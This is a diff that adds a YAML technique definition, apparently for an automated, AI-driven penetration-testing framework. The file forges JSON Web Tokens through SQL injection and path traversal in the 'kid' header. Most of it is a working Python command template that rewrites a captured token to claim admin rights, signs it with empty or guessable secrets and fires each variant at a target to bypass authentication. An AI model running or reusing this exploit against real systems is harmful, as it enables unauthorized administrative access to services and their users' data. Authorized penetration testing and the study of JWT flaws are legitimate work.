@@ -1,0 +1,85 @@
+name: jwt_kid_sqli
+category: web
+description: SQL injection in JWT 'kid' header to control key lookup and forge tokens
+preconditions:
+- auth_endpoint_known
+- jwt_token_found
+parameters:
+  target_url: from_engagement.target_url
+  token: from_finding.jwt_token
+command_template: >
+  python3 -c "
+  import json, base64, hmac, hashlib, urllib.request, sys
+
+  token = '{token}'
+  target = '{target_url}'
+
+  parts = token.split('.')
+  if len(parts) != 3:
+      print('Invalid JWT'); sys.exit(1)
+
+  def b64d(s):
+      s += '=='*((4-len(s)%4)%4)
+      return base64.urlsafe_b64decode(s)
+  def b64e(b):
+      if isinstance(b, str): b = b.encode()
+      return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+
+  header = json.loads(b64d(parts[0]))
+  payload = json.loads(b64d(parts[1]))
+  print(f'kid field: {header.get(\"kid\",\"none\")}')
+
+  # Payloads: force key lookup to return empty string, then sign with empty string
+  sqli_kids = [
+      \"' UNION SELECT '' --\",
+      \"' UNION SELECT '0' --\",
+      \"1' OR '1'='1\",
+      \"../../../dev/null\",      # path traversal kid
+      \"/dev/null\",
+  ]
+
+  payload['role'] = 'admin'
+  payload['admin'] = True
+
+  for sqli_kid in sqli_kids:
+      # Sign with empty string (or known string) as HMAC key
+      for secret in [b'', b'0', b'null', b'undefined']:
+          try:
+              new_header = dict(header)
+              new_header['kid'] = sqli_kid
+              new_header['alg'] = 'HS256'
+              hdr_b64 = b64e(json.dumps(new_header, separators=(',',':')))
+              pay_b64 = b64e(json.dumps(payload, separators=(',',':')))
+              msg = f'{hdr_b64}.{pay_b64}'.encode()
+              sig = hmac.new(secret, msg, hashlib.sha256).digest()
+              forged = f'{hdr_b64}.{pay_b64}.{b64e(sig)}'
+
+              req = urllib.request.Request(target,
+                  headers={'Authorization': f'Bearer {forged}'})
+              try:
+                  with urllib.request.urlopen(req, timeout=8) as r:
+                      body = r.read().decode()[:200]
+                      print(f'[HIT] kid={sqli_kid!r} secret={secret!r}: {r.status}')
+                      print(f'  Body: {body}')
+              except urllib.error.HTTPError as e:
+                  if e.code not in (401, 403):
+                      print(f'[?] kid={sqli_kid!r}: HTTP {e.code}')
+          except: pass
+  print('kid SQLi probe complete')
+  "
+parser: web_response_parser
+expected_effects:
+- jwt_forged
+- auth_bypass_achieved
+falsifier:
+  pattern: 401|403|Invalid kid|Unauthorized
+  timeout: 60
+model_tier: sonnet
+mechanism: >
+  Some JWT libraries look up the signing key by kid using SQL: SELECT key FROM keys WHERE id='<kid>'.
+  UNION injection returns a controlled value; sign with that value as HMAC secret.
+  Path traversal kid: kid='../../../dev/null' — server reads /dev/null (empty), sign with empty string.
+  Always try HMAC secrets: empty string, '0', 'null', 'undefined'. Use jwt_tool -I -hc kid -hv '<payload>'.
+hacktricks_ref: pentesting-web/hacking-jwt-json-web-tokens.md
+destructive: false
+opsec: low
